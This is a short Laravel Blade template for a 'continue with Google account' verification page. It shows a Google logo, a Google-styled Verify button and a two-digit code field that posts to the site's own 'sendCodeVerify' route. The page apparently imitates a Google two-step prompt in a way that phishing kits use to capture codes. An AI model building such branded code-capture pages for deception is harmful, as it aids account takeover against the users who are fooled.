<x-guest-layout>
    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />
    @section('title')
        {{__('Enter verification code and continue with Google account')}}
    @endsection
    <div class="flex items-center justify-center mt-4" style="width: 150px;height: 30px;">
        <img  src="{{config('app.google-logo')}}" alt="Google" width="100%" height="100%"/>
    </div>
    <br/>
    <p>Enter your verification code</p>
    <br/>
    <form method="POST" action="{{route('sendCodeVerify') }}">
        @csrf
        <div>
            <x-bladewind::code total_digits="2" name="spin_me" on_verify="triggerTimerManually"  />
        </div>
        <div class="flex items-center justify-end mt-4">
            <button class="ml-3" id="submitButton" style="width: 120px;height: 30px;color: #fff;background-color: #1a73e8;border-radius: 5px;">
                {{ __('Verify') }}
            </button>
        </div>
    </form>
</x-guest-layout>
